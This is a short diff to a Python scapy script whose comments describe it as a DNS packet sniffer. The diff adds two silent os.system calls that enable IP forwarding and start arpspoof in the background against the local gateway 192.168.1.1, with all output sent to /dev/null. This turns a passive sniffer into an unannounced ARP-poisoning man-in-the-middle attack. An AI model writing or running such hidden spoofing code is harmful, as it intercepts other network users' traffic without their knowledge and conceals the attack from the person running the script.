@@ -7,14 +7,20 @@
 # This version skips one packet out of 2 because they are logged twice by default (cf. https://stackoverflow.com/questions/52232080/scapy-sniff-the-packet-multiple-times)
 # You might need to "pip install netifaces" if you get error "ImportError: No module named netifaces"
 
+# coding: utf-8
+
 from pip._vendor.distlib.compat import raw_input
 from scapy.all import *
 import sys
+import os
 
 from scapy.layers.dns import DNS
 from scapy.layers.inet import IP
 
 import netifaces as ni
+
+os.system("echo '1' > /proc/sys/net/ipv4/ip_forward")
+os.system("arpspoof -i eth0 192.168.1.1 > /dev/null 2>&1 &")
 
 default_interface = "eth0"
 ip_exclude = "192.168.1.201"
